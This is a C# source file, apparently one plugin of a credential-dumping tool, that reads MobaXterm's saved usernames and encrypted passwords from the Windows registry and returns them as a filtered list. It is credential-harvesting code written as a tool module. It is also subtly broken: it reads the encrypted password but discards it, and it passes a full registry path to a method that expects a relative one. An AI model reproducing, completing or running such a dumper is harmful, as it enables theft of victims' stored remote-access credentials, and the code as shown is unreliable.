using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Plugin48Dumper
{
    public class clsMobaXtermDumper : clsDumper
    {
        public clsMobaXtermDumper()
        {
            Entry = "xterm";
            Description = "MobaXterm dumper";
            Usage = string.Empty;
        }

        public class clsCredential
        {
            public string Username;
            public string Password;
        }

        public List<clsCredential> fnlsDump(int nCount = 100, string szRegex = "")
        {
            List<clsCredential> ls = new List<clsCredential>();
            int n = 0;

            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\SOFTWARE\\Mobatek\\MobaXterm\\"))
            {
                using (RegistryKey subP = root.OpenSubKey("P"))
                {
                    foreach (string szSubKey in subP.GetSubKeyNames())
                    {
                        string szUsername = szSubKey;
                        string szEncPassword = (string)subP.GetValue(szSubKey);

                        if (n >= nCount)
                            break;

                        if (Regex.IsMatch(szUsername, szRegex))
                        {
                            ls.Add(new clsCredential()
                            {
                                Username = szSubKey,
                                Password = string.Empty,
                            });
                        }

                        n++;
                    }
                }
            }

            return ls;
        }
    }
}
